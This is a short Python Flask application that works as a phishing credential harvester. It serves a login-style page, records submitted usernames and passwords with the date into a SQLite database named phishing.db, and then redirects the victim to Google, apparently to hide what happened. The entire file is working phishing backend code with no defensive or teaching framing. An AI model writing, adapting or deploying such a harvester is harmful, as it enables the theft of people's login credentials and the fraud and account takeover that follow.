from flask import Flask, render_template, request, redirect
import sqlite3
import time

app = Flask(__name__)


@app.route("/")
def main():
    return render_template("index.html")


@app.route("/data", methods=["POST"])
def dataProcess():
    if request.method == "POST":
        date = f"{time.localtime().tm_mday}/{time.localtime().tm_mon}/{time.localtime().tm_year}"

        connection = sqlite3.connect("phishing.db")
        cursor = connection.cursor()
        cursor.execute(f"INSERT INTO phishing (user, pass, date) VALUES (:user, :pass, :date)", {"user": request.form["user"], "pass": request.form["pass"], "date": date})
        connection.commit()

        cursor.close()
        connection.close()

        return redirect("https://www.google.com/")
        
app.run()